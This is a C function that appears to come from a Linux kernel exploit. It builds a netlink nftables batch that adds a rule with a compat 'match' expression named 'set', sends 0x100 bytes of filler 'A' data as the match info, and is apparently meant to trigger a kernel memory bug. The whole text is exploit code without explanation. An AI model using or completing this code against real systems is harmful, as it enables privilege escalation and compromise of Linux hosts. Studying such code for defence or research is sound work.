void new_rule(struct nl_sock * socket, char *table_name, char *chain_name){
    struct nl_msg * msg = nlmsg_alloc();
    //(NFNL_SUBSYS_IPSET << 8) | (IPSET_CMD_CREATE);
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_BEGIN,   // TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST //NLM_F_ECHO
    );
    struct nfgenmsg * h = malloc(sizeof(struct nfgenmsg));
    h->nfgen_family = 2;//NFPROTO_IPV4;
    h->version = 0;
    h->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr1), h, sizeof(struct nfgenmsg));

    struct nl_msg * msg2 = nlmsg_alloc();
    struct nlmsghdr *hdr2 = nlmsg_put(
            msg2,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            (NFNL_SUBSYS_NFTABLES << 8) | (NFT_MSG_NEWRULE),// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST|NLM_F_CREATE //NLM_F_ECHO
    );
    struct nfgenmsg * h2 = malloc(sizeof(struct nfgenmsg));
    h2->nfgen_family = 2;//NFPROTO_IPV4;
    h2->version = 0;
    h2->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr2), h2, sizeof(struct nfgenmsg));
    struct nl_msg * msg3 = nlmsg_alloc();
    struct nlmsghdr *hdr3 = nlmsg_put(
            msg3,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_END,// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST //NLM_F_ECHO
    );
    struct nl_msg * exprs = nlmsg_alloc();
    struct nl_msg *data_nest = nlmsg_alloc();
    struct nl_msg *expr_data = nlmsg_alloc(); 
    
    char *a = malloc(0x100);
    memset(a,0x41,0x100);
    nla_put_string(expr_data, NFTA_MATCH_NAME, "set");
    nla_put_u32(expr_data, NFTA_MATCH_REV, htonl(0));
    nla_put(expr_data, NFTA_MATCH_INFO,0x100,a);

    nla_put_string(data_nest, NFTA_EXPR_NAME, "match");
    nla_put_nested(data_nest, NFTA_EXPR_DATA, expr_data);

    nla_put_nested(exprs, NFTA_LIST_ELEM, data_nest);
    nla_put_string(msg2, NFTA_RULE_TABLE, table_name);
    nla_put_string(msg2, NFTA_RULE_CHAIN, chain_name);
    nla_put_nested(msg2, NFTA_RULE_EXPRESSIONS, exprs);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len) + NLMSG_ALIGN(hdr2->nlmsg_len) + NLMSG_ALIGN(hdr3->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    memcpy(buf+NLMSG_ALIGN(hdr1->nlmsg_len),hdr2, NLMSG_ALIGN(hdr2->nlmsg_len));
    memcpy(buf+NLMSG_ALIGN(hdr1->nlmsg_len)+NLMSG_ALIGN(hdr2->nlmsg_len),hdr3,NLMSG_ALIGN(hdr3->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
        printf("Create rule\n");
    }
}
